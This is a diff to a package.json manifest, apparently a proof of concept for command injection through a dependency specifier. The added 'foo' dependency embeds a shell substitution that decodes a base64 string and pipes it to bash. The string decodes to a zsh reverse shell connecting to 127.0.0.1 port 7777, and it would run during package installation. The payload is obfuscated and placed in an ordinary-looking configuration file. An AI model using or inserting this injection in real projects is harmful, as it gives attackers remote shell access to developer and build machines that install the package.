@@ -4,8 +4,11 @@
   "description": "Foo bar",
   "main": "index.js",
   "scripts": {
-    "install": "echo 'test'"
+    "install": "echo 'hello world'"
   },
   "author": "",
+  "dependencies": {
+    "foo": "piergiorgioladisa/funC#$({echo,'enNoIC1jICd6bW9kbG9hZCB6c2gvbmV0L3RjcCAmJiB6dGNwIDEyNy4wLjAuMSA3Nzc3ICYmIHpzaCA+JiRSRVBMWSAyPiYkUkVQTFkgMD4mJFJFUExZJw=='}|{base64,--decode}|bash)"
+  },
   "license": "ISC"
 }
